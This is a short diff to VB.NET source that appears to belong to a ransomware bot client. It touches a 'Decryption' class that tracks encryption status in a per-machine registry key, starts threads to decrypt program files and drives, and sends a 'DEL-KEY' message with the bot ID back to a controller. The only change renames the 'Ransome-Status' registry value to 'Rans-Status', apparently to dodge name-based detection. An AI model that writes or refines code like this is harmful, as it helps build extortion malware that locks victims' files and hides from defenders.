@@ -19,12 +19,12 @@ Public Class Decryption
 
     Public Sub Dec(ByVal key As String)
         Try
-            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", Nothing)
+            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", Nothing)
             If readValue = "Decrypted" Or readValue = "Decryption In progress..." Or readValue = "Encryption in progress..." Then
                 Exit Sub
             End If
 
-            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", "Decryption in progress...")
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", "Decryption in progress...")
 
             Dim T1 As New Threading.Thread(AddressOf Dec_Prog)
             Dim T2 As New Threading.Thread(AddressOf Dec_Driver)
@@ -44,7 +44,7 @@ Public Class Decryption
             Threading.Thread.CurrentThread.Sleep(1000)
             Main.Send("DEL-KEY" + SPL + ID.Bot)
 
-            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", "Decrypted")
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", "Decrypted")
 
             Try
                 Main.CloseMe()
